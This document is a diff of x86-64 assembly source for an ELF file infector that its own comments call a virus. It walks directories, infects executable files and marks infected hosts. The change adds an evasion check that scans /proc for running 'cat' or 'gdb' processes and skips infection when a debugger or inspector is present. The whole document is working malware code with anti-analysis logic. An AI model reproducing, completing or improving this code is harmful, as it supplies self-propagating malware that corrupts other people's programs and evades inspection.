@@ -26,9 +26,7 @@ _start:
 newline db `\n`, 0x0
 
 _print:; (string rdi)
-	push r11
 	push rdx
-	push rbx
 	push rsi
 
 	call _ft_strlen; ft_strlen(rdi)
@@ -43,25 +41,28 @@ _print:; (string rdi)
 	syscall
 
 	push rsi
-	pop rbx
 	lea rsi, [rel newline]
 	push 1
 	pop rax; write
 	push 1
 	pop rdx
 	syscall
-	push rbx
 	pop rdi
 
 	pop rsi
-	pop rbx
 	pop rdx
-	pop r11
 ret
 
 %endif; ========================================================================
 
 _inject:
+	lea rdi, [rel process_dir]
+	push 1
+	pop rsi ; mode for move_through_dir
+	call _move_through_dir
+	cmp rax, 0x0
+	jne _end
+
 	pop rdi; pop addr from stack
 
 	; save register
@@ -81,35 +82,40 @@ _inject:
 		pop r9
 	; r9 contains the end of the virus (minus params)
 
+	xor rsi, rsi ; mode for move_through_dir
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
 	.loop_array_string:
 		add rdi, rcx
-		call _infect_dir
-		xor rcx, rcx; = 0
-		.next_string:; seek next dir
-			inc rcx
-			cmp byte[rdi + rcx], 0x0
-			jnz .next_string
-		inc rcx
-		cmp byte[rdi + rcx], 0x0
-		jnz .loop_array_string
+		call _ft_strlen
+		push rax
+		pop rcx
+		call _move_through_dir
+	inc rcx
+	cmp byte[rdi + rcx], 0x0
+	jnz .loop_array_string
 
-	xor rax, rax; = 0
-	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-	jne _infected
-	jmp _exit
+	_end:
+		xor rax, rax; = 0
+		cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
+		jne _infected
+		jmp _exit
 
-_infect_dir:; (string rdi)
+_move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push r10
 	push r11
 	push r12
-	push rdx
+	push r13
+	push rbx
 	push rcx
+	push rdx
 
 	%ifdef DEBUG
 		call _print; _print(rdi)
 	%endif
+
+	push rsi
+	pop r13
 
 	push 2
 	pop rax; open
@@ -144,7 +150,7 @@ _infect_dir:; (string rdi)
 		pop rdx; nread
 		xor rcx, rcx; = 0
 
-	.loop_in_dir:
+	.loop_in_file:
 		cmp rcx, rdx
 		jge .getdents; rcx >= rdx
 		mov rdi, r12
@@ -160,15 +166,15 @@ _infect_dir:; (string rdi)
 			add rsi, rcx
 			call _ft_strcmp
 			cmp rax, 0x0
-			je .next_dir
+			je .next_file
 			xor rcx, rcx; = 0
 			.next_string:; seek next dir
 				inc rcx
 				cmp byte[rsi + rcx], 0x0
 				jnz .next_string
-			inc rcx
-			cmp byte[rsi + rcx], 0x0
-			jnz .loop_array_string
+		inc rcx
+		cmp byte[rsi + rcx], 0x0
+		jnz .loop_array_string
 
 		; concat_path
 			push rbx
@@ -200,14 +206,57 @@ _infect_dir:; (string rdi)
 
 			mov rax, [rsi + 24] ; st_mode
 			and rax, 0o0170000 ; S_IFMT
+
+			cmp r13, 0; infect
+			je .infect
+
+			; process
+			and rax, 0o0170000 ; S_IFMT
 			cmp rax, 0o0040000 ; S_IFDIR
-			je .infect_dir
+			je .process_dir
 			cmp rax, 0o0100000 ; S_IFREG
-			je .infect_file
+			jne .free_buffers
+
+			push rdi
+			push rsi
+			mov rdi, rbx
+			lea rsi, [rel process_status]
+			call _ft_strcmp
+			pop rsi
+			pop rdi
+
+			cmp rax, 0x0
+			jne .free_buffers
+			call _check_file_process
+
+			cmp rax, 0x0
+			jne .process_found
 			jmp .free_buffers
 
+			.process_dir:
+				push rdi
+				push rbx
+				pop rdi
+				call _ft_isnum
+				pop rdi
+				cmp rax, 0x0
+				je .free_buffers
+				mov rsi, r13
+				call _move_through_dir
+				cmp rax, 0x0
+				jne .process_found
+				jmp .free_buffers
+
+			.infect:
+				cmp rax, 0o0040000 ; S_IFDIR
+				je .infect_dir
+				cmp rax, 0o0100000 ; S_IFREG
+				je .infect_file
+				jmp .free_buffers
+
 		.infect_dir:
-			call _infect_dir
+			mov rsi, r13
+			call _move_through_dir
 			jmp .free_buffers
 
 		.infect_file:
@@ -219,7 +268,7 @@ _infect_dir:; (string rdi)
 			add rsp, 4096
 			pop rbx
 
-		.next_dir:
+		.next_file:
 			pop rcx
 			mov rsi, r12
 			add rsi, rcx
@@ -227,9 +276,17 @@ _infect_dir:; (string rdi)
 			movzx edi, word [rsi + 16]; linux_dir->d_reclen
 			add rcx, rdi
 			pop rdi
-			jmp .loop_in_dir
+			jmp .loop_in_file
 
+	.process_found:
+		add rsp, 600
+		pop r11 ; stat using r11
+		add rsp, 4096
+		pop rbx
+		pop rcx
 	.close:
+		push rax
+		pop rsi
 		push r11
 		pop rdi
 		push 3
@@ -238,14 +295,18 @@ _infect_dir:; (string rdi)
 		push r10
 		pop rdi
 		add rsp, 1024
+		push rsi
+		pop rax
 
 	.return:
 
-		pop rcx
-		pop rdx
-		pop r12
-		pop r11
-		pop r10
+	pop rdx
+	pop rcx
+	pop rbx
+	pop r13
+	pop r12
+	pop r11
+	pop r10
 ret
 
 _infect_file: ; (string rdi, stat rsi)
@@ -253,7 +314,6 @@ _infect_file: ; (string rdi, stat rsi)
 	push r11
 	push r12
 	push r13
-	push r14
 	push rbx
 	push rcx
 	push rdx
@@ -403,14 +463,14 @@ _infect_file: ; (string rdi, stat rsi)
 			pop rax
 			syscall
 	.unmap:
-;		push r11; munmap using r11 ?
+		push r11; munmap using r11 ?
 		push r13
 		pop rdi
 		mov rsi, [r12 + 48] ; statbuf.st_size
 		push 11
 		pop rax; munmap
 		syscall
-;		pop r11
+		pop r11
 	.close:
 		push r11
 		pop rdi
@@ -426,11 +486,97 @@ _infect_file: ; (string rdi, stat rsi)
 	pop rdx
 	pop rcx
 	pop rbx
-	pop r14
 	pop r13
 	pop r12
 	pop r11
 	pop r10
+ret
+
+_check_file_process:; (string rdi)
+	push r8
+	push r9
+	push rcx
+	push rdx
+	push rsi
+
+	sub rsp, 0x800; buffer to read
+
+	xor rsi, rsi; O_RDONLY
+	push 2
+	pop rax; open
+	syscall
+	push rdi
+	pop r8
+	push rax
+	pop r9; fd
+	xor rax, rax ; read and 0 if can't open
+	cmp r9, 0x0
+	jl .return; jump lower
+
+	.loop_read:
+		mov rdi, r9
+		mov rsi, rsp
+		push 0x800
+		pop rdx
+		syscall
+
+		cmp rax, 0x0
+		je .close
+
+			push rax
+			pop rsi
+			mov rsi, rax
+			lea rdi, [rel process]
+			xor rcx, rcx; = 0
+			.loop_array_string:
+				add rdi, rcx
+				; check if it is in the file
+				call _ft_strlen
+				cmp rsi, rax
+				jl .close
+				push rax
+				pop rcx
+				push rdi
+				pop rdx
+				mov rdi, rsp; buffer
+				call _ft_memmem
+				cmp rax, 0x0
+				jne .close
+				push rsi
+				push rdi
+				pop rsi
+				push rdx
+				pop rdi
+				call _ft_strcmp
+				pop rsi
+				cmp rax, 0x0
+				je .close
+			inc rcx
+			cmp byte[rdi + rcx], 0x0
+			jnz .loop_array_string
+
+	xor rax, rax
+	.close:
+		push rax
+		pop rsi
+		push r9
+		pop rdi
+		push 3
+		pop rax; close
+		syscall
+		push rsi
+		pop rax
+	.return:
+		push r8
+		pop rdi
+
+	add rsp, 0x800
+
+	pop rsi
+	pop rdx
+	pop rcx
+	pop r9
+	pop r8
 ret
 
 _infected:
@@ -460,6 +606,28 @@ _exit:
 
 ; ================================ utils =======================================
 
+_ft_isnum:; (string rdi) ; 1 yes 0 no
+	push rcx
+
+	push 1
+	pop rax
+	xor rcx, rcx
+	.loop_char:
+		cmp byte[rdi + rcx], 0x0
+		je .return
+		cmp byte[rdi + rcx], '0'
+		jl .isnotnum
+		cmp byte[rdi + rcx], '9'
+		jg .isnotnum
+		inc rcx
+	jmp .loop_char
+	.isnotnum:
+		xor rax,rax
+	.return:
+
+	pop rcx
+ret
+
 _ft_strlen:; (string rdi)
 	push rcx
 
@@ -468,12 +636,12 @@ _ft_strlen:; (string rdi)
 		cmp byte [rdi + rcx], 0
 		jz .return
 		inc rcx
-		jmp .loop_char
+	jmp .loop_char
 	.return:
 		push rcx
 		pop rax
 
-		pop rcx
+	pop rcx
 ret
 
 _ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
@@ -566,6 +734,17 @@ _ft_strcmp: ; (string rdi, string rsi)
 	call _ft_strlen
 	push rax
 	pop rdx
+	push rdi
+	push rsi
+	pop rdi
+	call _ft_strlen
+	push rdi
+	pop rsi
+	pop rdi
+	cmp rax, rdx
+	je .continue
+	inc rdx
+	.continue:
 	call _ft_memcmp
 	pop rdx
 ret
@@ -589,6 +768,10 @@ _ft_strcpy: ; (string rdi, string rsi)
 ret
 
 ; ==============================================================================
+
+process_dir db `/proc`, 0x0
+process_status db `status`, 0x0
+process db `cat`, 0x0, `gdb`, 0x0, 0x0
 
 ;                   E     L    F   |  v ELFCLASS64
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
